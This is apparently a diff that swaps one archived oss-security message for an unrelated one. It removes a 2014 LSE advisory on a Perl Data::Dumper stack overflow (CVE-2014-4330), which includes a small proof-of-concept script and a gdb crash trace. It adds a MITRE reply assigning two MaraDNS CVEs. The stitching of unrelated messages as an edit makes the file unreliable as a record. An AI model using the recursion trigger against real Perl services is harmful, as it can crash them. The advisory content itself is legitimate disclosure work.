@@ -1,123 +1,41 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/25/12
-Message-ID: <5423D985.6060007@lsexperts.de>
-Date: Thu, 25 Sep 2014 10:59:49 +0200
-From: advisories <advisories@...xperts.de>
-To: bugtraq@...urityfocus.com
-CC: oss-security@...ts.openwall.com, submissions@...ketstormsecurity.org,  fulldisclosure@...lists.org, bugs@...uritytracker.com
-Subject: LSE Leading Security Experts GmbH - LSE-2014-06-10 - Perl CORE - Deep Recursion Stack Overflow
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/02/19/15
+Message-Id: <201402192350.s1JNo5vG029674@linus.mitre.org>
+Date: Wed, 19 Feb 2014 18:50:05 -0500 (EST)
+From: cve-assign@...re.org
+To: mprpic@...hat.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: CVE request: MaraDNS DoS due to incorrect bounds checking on certain strings
 Content-Type: text/plain; charset=utf-8
 
-=== LSE Leading Security Experts GmbH - Security Advisory LSE-2014-06-10 ===
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-Perl CORE - Deep Recursion Stack Overflow
------------------------------------------
+There are two CVEs because of the distinct types of issues.
 
-Affected Versions
-=================
-Perl v5.20.1 and below
+> https://github.com/samboy/MaraDNS/commit/f015495d221f1c2b2f10db38e87cecf3839d6093
 
-
-Issue Overview
-==============
-Vulnerability Type: Stack Overflow
-Technical Risk: high
-Likelihood of Exploitation: low
-Vendor: Perl
-Vendor URL: http://www.perl.org
-Credits: LSE Leading Security Experts GmbH employee Markus Vervier
-Advisory URL: https://www.lsexperts.de/advisories/lse-2014-06-10.txt
-Advisory Status: Public
-CVE-Number: CVE-2014-4330
-CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4330
+This is a logic error. It makes no sense to add begin and obj->len.
+Use CVE-2014-2031.
 
 
-Impact
-======
-When the runtime stack grows over its maximal size, a guard page on most modern
-operating systems is hit causing the Perl interpreter to crash.
-Depending on context code execution on some architectures might be possible
-if certain conditions are met.
+> https://github.com/samboy/MaraDNS/commit/2cfcd2397cb8168d4aa4594839fabe88420d03c3
 
+This is missing input validation. Use CVE-2014-2032.
 
-Issue Description
-=================
-During internal development a stack overflow was discovered when serializing
-data via the Data::Dumper extension which is part of Perl-Core.
-By using the "Dumper" method on a large Array-Reference which recursively
-contains other Array-References, it is possible to cause many recursive
-calls to the DD_dump native function and ultimately exhaust all available stack
-memory.
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (SunOS)
 
-
-Temporary Workaround and Fix
-============================
-Applications written in Perl should ensure that a sanity check on data
-serialized by Data::Dumper is performed.
-
-According to the vendor a patch is available and coordinated with downstream
-vendors.
-
-
-Proof of Concept
-================
-$ cat min.pl
-use strict;
-use Data::Dumper;
-
-my $dumpme = [];
-for (my $i = 0; $i < $ARGV[0]; $i++) {
-	$dumpme = [$dumpme, "AAAAAAAA"];
-}
-print Dumper($dumpme);
-
-$ gdb --args perl min.pl 20000
-GNU gdb (GDB) 7.4.1-debian
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later
-<http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "x86_64-linux-gnu".
-For bug reporting instructions, please see:
-<http://www.gnu.org/software/gdb/bugs/>...
-Reading symbols from /usr/bin/perl...Reading symbols from
-/usr/lib/debug/usr/bin/perl...done.
-done.
-(gdb) run
-Starting program: /usr/bin/perl min.pl 20000
-warning: no loadable sections found in added symbol-file system-supplied
-DSO at
-0x7ffff7ffa000
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-
-Program received signal SIGSEGV, Segmentation fault.
-_IO_vfprintf_internal (s=0x7fffff7ff5c0, format=0x7ffff6bf5f89 "%ld",
-    ap=0x7fffff7ff6f0) at vfprintf.c:1328
-1328	vfprintf.c: No such file or directory.
-
-It was confirmed that the overflow can be triggered via the XML::Parser
-extension when parsing and dumping specially crafted XML-Documents.
-
-
-History
-=======
-2014-06-10 Issue discovery during internal development
-2014-06-11 Vendor contacted
-2014-06-11 Vendor reply
-2014-06-13 CVE requested
-2014-07-01 Vulnerability confirmed by vendor
-2014-07-02 CVE-2014-4330 assigned
-2014-09-25 Advisory released
-
-GPG Signature
-=============
-This advisory is signed with the GPG key of the
-LSE Leading Security Experts GmbH advisories team.
-The key can be downloaded here: https://www.lsexperts.de/advisories-key-99E3277C.asc
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+iQEcBAEBAgAGBQJTBULYAAoJEKllVAevmvmsPIEH/2mlAM6SDBhBwxNCHbaCcPw3
+bowmbkIuYTEO8prVC6tmcXrrvgnHYZMv5yjdLRCQHHEGnhxWt5OVS7uR8TQV1JBT
+k4AcjmaabxZ9HNTQyWKbzUWH+Q9kzlhD13isvi456yRjulIPXKBZ3AeYOUVZ3lto
+IcvukQYqEBVpwLol9PaYyjzj013lFd0XKeduEX8Yx9OTz8WA6+2idrE7B7sP2Qts
+45nFYGZyIlyb6YbW7+e4tYFwMI9NykmCnOoKacyXpPE4XKi1bk4tZ4XuUXVDX12R
+K3EKLtOuQyfMlVAM928o9+DROAkfJxwzOC/mQQL2lZGJfzytzmwHkY/aHzp0cXY=
+=kqvj
+-----END PGP SIGNATURE-----
